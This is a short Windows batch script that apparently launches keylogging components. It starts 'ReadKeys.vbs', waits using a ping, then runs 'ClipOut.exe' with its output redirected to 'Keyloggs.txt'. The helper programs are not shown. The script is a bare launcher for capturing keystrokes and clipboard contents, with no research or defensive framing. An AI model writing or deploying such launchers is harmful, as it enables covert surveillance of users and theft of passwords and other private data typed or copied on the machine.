start .\App\ReadKeys.vbs
ping 1.1.1.1 -n 1 -w 200 > nul
start .\App\ClipOut.exe /T > Keyloggs.txt
exit